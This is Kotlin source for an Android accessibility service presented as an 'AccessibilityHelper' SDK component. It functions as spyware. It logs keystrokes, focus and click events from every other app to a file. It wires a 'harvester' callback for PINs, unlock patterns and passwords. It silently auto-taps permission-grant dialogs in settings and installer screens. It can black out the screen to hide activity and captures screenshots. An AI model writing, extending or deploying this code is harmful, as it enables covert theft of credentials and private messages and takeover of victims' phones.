package com.openaccess.sdk.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.KeyguardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.ColorSpace
import android.hardware.HardwareBuffer
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper

import android.view.Display
import android.view.Gravity
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.FrameLayout
import kotlinx.coroutines.suspendCancellableCoroutine
import java.io.ByteArrayOutputStream
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.Executors
import kotlin.collections.mutableMapOf
import kotlin.collections.mutableListOf
import kotlin.coroutines.resume

data class AppLogEntry(
    val timestamp: Long,
    val text: String,
    val eventType: String
)

data class AppSession(
    val packageName: String,
    val appName: String,
    val firstSeen: Long,
    var lastSeen: Long,
    val entries: MutableList<AppLogEntry> = mutableListOf()
)

class AccessibilityHelper : AccessibilityService() {
    companion object {
        private const val TAG = "AccessibilityHelper"
        private val textLock = Any()
        var capturedText: String = ""
            private set
        var isRunning = false
            private set
        private var logFile: File? = null
        @JvmStatic var instance: AccessibilityHelper? = null
            private set
        private val screenshotExecutor = Executors.newSingleThreadExecutor()

        private val appSessions = mutableMapOf<String, AppSession>()
        private var currentForegroundApp: String? = null

        fun getText(): String = synchronized(textLock) { capturedText }
        private fun appendText(text: String) = synchronized(textLock) {
            capturedText += text
            if (capturedText.length > 50000) capturedText = capturedText.takeLast(25000)
        }

        fun setLogFile(f: File) { logFile = f }

        fun getAppSessions(): Map<String, AppSession> = synchronized(textLock) {
            appSessions.toMap()
        }

        fun getFormattedAppLogs(): String = synchronized(textLock) {
            if (appSessions.isEmpty()) return "No app activity logged"

            val sb = StringBuilder()
            val sortedSessions = appSessions.values.sortedByDescending { it.lastSeen }

            for (session in sortedSessions) {
                if (session.entries.isEmpty()) continue

                val timeFmt = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
                val firstTime = timeFmt.format(Date(session.firstSeen))
                val lastTime = timeFmt.format(Date(session.lastSeen))

                sb.appendLine("===============================")
                sb.appendLine("[${session.appName}]")
                sb.appendLine("${session.packageName}")
                sb.appendLine("$firstTime - $lastTime")
                sb.appendLine("===============================")

                for (entry in session.entries) {
                    val entryTime = timeFmt.format(Date(entry.timestamp))
                    when (entry.eventType) {
                        "TEXT" -> sb.appendLine("  [$entryTime] $entry.text")
                        "FOCUS" -> sb.appendLine("  [$entryTime] Focus: $entry.text")
                        "CLICK" -> sb.appendLine("  [$entryTime] Click: $entry.text")
                        "PAGE" -> sb.appendLine("  [$entryTime] Page: $entry.text")
                    }
                }
                sb.appendLine()
            }
            sb.toString().take(3500)
        }

        fun getAppSummary(): String = synchronized(textLock) {
            if (appSessions.isEmpty()) return "No app activity logged"

            val sb = StringBuilder()
            val sortedSessions = appSessions.values.sortedByDescending { it.entries.size }

            sb.appendLine("App Activity Summary:")
            sb.appendLine()

            for (session in sortedSessions.take(15)) {
                val textEntries = session.entries.count { it.eventType == "TEXT" }
                val clickEntries = session.entries.count { it.eventType == "CLICK" }
                val focusEntries = session.entries.count { it.eventType == "FOCUS" }
                val pageEntries = session.entries.count { it.eventType == "PAGE" }

                val timeFmt = SimpleDateFormat("HH:mm", Locale.getDefault())
                val lastTime = timeFmt.format(Date(session.lastSeen))

                sb.appendLine("[${session.appName}]")
                sb.appendLine("  ${session.packageName}")
                sb.appendLine("  $textEntries typed | $clickEntries clicks | $focusEntries focus | $pageEntries pages")
                sb.appendLine("  Last: $lastTime")
                sb.appendLine()
            }

            val totalText = appSessions.values.sumOf { it.entries.count { e -> e.eventType == "TEXT" } }
            val totalClicks = appSessions.values.sumOf { it.entries.count { e -> e.eventType == "CLICK" } }

            sb.appendLine("Totals: $totalText keystrokes | $totalClicks clicks across ${appSessions.size} apps")
            sb.toString().take(1900)
        }

        fun clearAppLogs() = synchronized(textLock) {
            appSessions.clear()
            currentForegroundApp = null
            capturedText = ""
        }

        private fun getAppName(pkg: String): String {
            return try {
                instance?.packageManager?.getApplicationLabel(
                    instance!!.packageManager.getApplicationInfo(pkg, 0)
                )?.toString() ?: pkg.split(".").lastOrNull() ?: pkg
            } catch (_: Exception) {
                pkg.split(".").lastOrNull() ?: pkg
            }
        }

        private fun getOrCreateSession(pkg: String): AppSession {
            return appSessions.getOrPut(pkg) {
                val now = System.currentTimeMillis()
                AppSession(
                    packageName = pkg,
                    appName = getAppName(pkg),
                    firstSeen = now,
                    lastSeen = now
                )
            }.apply { lastSeen = System.currentTimeMillis() }
        }

        suspend fun takeScreenshotAsync(): ByteArray? {
            val svc = instance ?: return null
            if (Build.VERSION.SDK_INT < 34) return null
            return suspendCancellableCoroutine { cont ->
                svc.takeScreenshot(Display.DEFAULT_DISPLAY, screenshotExecutor, object : AccessibilityService.TakeScreenshotCallback {
                    override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                        try {
                            val hb = result.hardwareBuffer
                            val cs = result.colorSpace
                            val bitmap = Bitmap.wrapHardwareBuffer(hb, cs) ?: run { cont.resume(null); return }
                            val stream = ByteArrayOutputStream()
                            bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream)
                            bitmap.recycle()
                            cont.resume(stream.toByteArray())
                        } catch (e: Exception) {
                            cont.resume(null)
                        }
                    }
                    override fun onFailure(errorCode: Int) {
                        cont.resume(null)
                    }
                })
            }
        }
    }

    lateinit var harvester: InputHelper
        private set
    private var windowManager: WindowManager? = null
    private var blackOverlay: FrameLayout? = null
    private var keyguardManager: KeyguardManager? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        isRunning = true
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
        harvester = InputHelper(this)
        logFile?.let { harvester.setLogFile(it) }
        harvester.setCallback { pin, pattern, password ->
        }

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_FOCUSED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED or
                    AccessibilityEvent.TYPE_WINDOWS_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 300
            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
        }
        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        var source: AccessibilityNodeInfo? = null
        try {
            source = event.source

            harvester.onAccessibilityEvent(event)

            val pkg = event.packageName?.toString() ?: ""
            if (pkg.isBlank() || pkg.contains("com.openaccess.sdk")) return

            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                trackAppSwitch(pkg, event)
            }

            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                if (pkg.contains("com.android.systemui") || pkg.contains("settings") ||
                    pkg.contains("packageinstaller") || pkg.contains("permissioncontroller")) {
                    source?.let { harvester.autoClickGrant(it) }
                }
            }

            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val textFromEvent = event.text?.joinToString("") ?: ""
                    val textFromSource = source?.text?.toString() ?: ""
                    val capturedText = textFromEvent.ifEmpty { textFromSource }
                    if (capturedText.isNotEmpty()) {
                        val entry = "[${System.currentTimeMillis()}] $pkg: $capturedText\n"
                        appendText(entry)
                        logFile?.appendText(entry)

                        synchronized(textLock) {
                            val session = getOrCreateSession(pkg)
                            session.entries.add(AppLogEntry(
                                timestamp = System.currentTimeMillis(),
                                text = capturedText,
                                eventType = "TEXT"
                            ))
                            if (session.entries.size > 200) {
                                session.entries.removeAt(0)
                            }
                        }
                    }
                }
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    val textFromEvent = event.text?.joinToString("") ?: ""
                    val textFromSource = source?.text?.toString() ?: ""
                    val hint = getHint(source)
                    val capturedText = textFromEvent.ifEmpty { textFromSource }.ifEmpty { hint }
                    if (capturedText.isNotEmpty()) {
                        val entry = "[${System.currentTimeMillis()}] Focus: $capturedText\n"
                        appendText(entry)
                        logFile?.appendText(entry)

                        synchronized(textLock) {
                            val session = getOrCreateSession(pkg)
                            session.entries.add(AppLogEntry(
                                timestamp = System.currentTimeMillis(),
                                text = capturedText,
                                eventType = "FOCUS"
                            ))
                        }
                    }
                }
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    val textFromEvent = event.text?.joinToString("") ?: ""
                    val textFromSource = source?.text?.toString() ?: ""
                    val capturedText = textFromEvent.ifEmpty { textFromSource }
                    if (capturedText.isNotEmpty()) {
                        val entry = "[${System.currentTimeMillis()}] Click: $capturedText\n"
                        appendText(entry)

                        synchronized(textLock) {
                            val session = getOrCreateSession(pkg)
                            session.entries.add(AppLogEntry(
                                timestamp = System.currentTimeMillis(),
                                text = capturedText,
                                eventType = "CLICK"
                            ))
                        }
                    }
                }
            }
        } catch (e: Exception) {
        } finally {
            try { source?.recycle() } catch (_: Exception) {}
        }
    }

    private fun trackAppSwitch(pkg: String, event: AccessibilityEvent) {
        if (pkg.isBlank()) return

        val className = event.className?.toString() ?: ""

        if (pkg != currentForegroundApp) {
            currentForegroundApp = pkg
            val appName = getAppName(pkg)

            synchronized(textLock) {
                getOrCreateSession(pkg)
            }

            val entry = "[${System.currentTimeMillis()}] App opened: $appName ($pkg)\n"
            appendText(entry)
            logFile?.appendText(entry)

            synchronized(textLock) {
                val session = getOrCreateSession(pkg)
                session.entries.add(AppLogEntry(
                    timestamp = System.currentTimeMillis(),
                    text = "$appName ($pkg)",
                    eventType = "PAGE"
                ))
            }
        }

        if (className.isNotBlank() && !className.contains(pkg)) {
            val pageName = className.substringAfterLast(".").replace("Activity", "").replace("Fragment", "")
            if (pageName.isNotBlank() && pageName.length < 50) {
                synchronized(textLock) {
                    val session = getOrCreateSession(pkg)
                    session.entries.add(AppLogEntry(
                        timestamp = System.currentTimeMillis(),
                        text = pageName,
                        eventType = "PAGE"
                    ))
                    if (session.entries.size > 200) {
                        session.entries.removeAt(0)
                    }
                }
            }
        }
    }

    private fun getHint(source: AccessibilityNodeInfo?): String {
        if (source == null) return ""
        return try {
            val hint = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                source.hintText?.toString()
            } else null
            hint ?: source.contentDescription?.toString() ?: ""
        } catch (_: Exception) { "" }
    }

    fun toggleBlackOverlay(enable: Boolean) {
        Handler(Looper.getMainLooper()).post {
            try {
                if (enable) {
                    if (blackOverlay == null) {
                        blackOverlay = FrameLayout(this).apply {
                            setBackgroundColor(Color.BLACK)
                        }
                        val params = WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.MATCH_PARENT,
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                            else
                                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                                    WindowManager.LayoutParams.FLAG_FULLSCREEN,
                            PixelFormat.TRANSLUCENT
                        ).apply { gravity = Gravity.TOP }
                        windowManager?.addView(blackOverlay, params)
                    }
                } else {
                    blackOverlay?.let {
                        try { windowManager?.removeView(it) } catch (_: Exception) {}
                        blackOverlay = null
                    }
                }
            } catch (e: Exception) {
            }
        }
    }

    override fun onInterrupt() {
        isRunning = false
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        isRunning = false
        toggleBlackOverlay(false)
        screenshotExecutor.shutdown()
    }
}
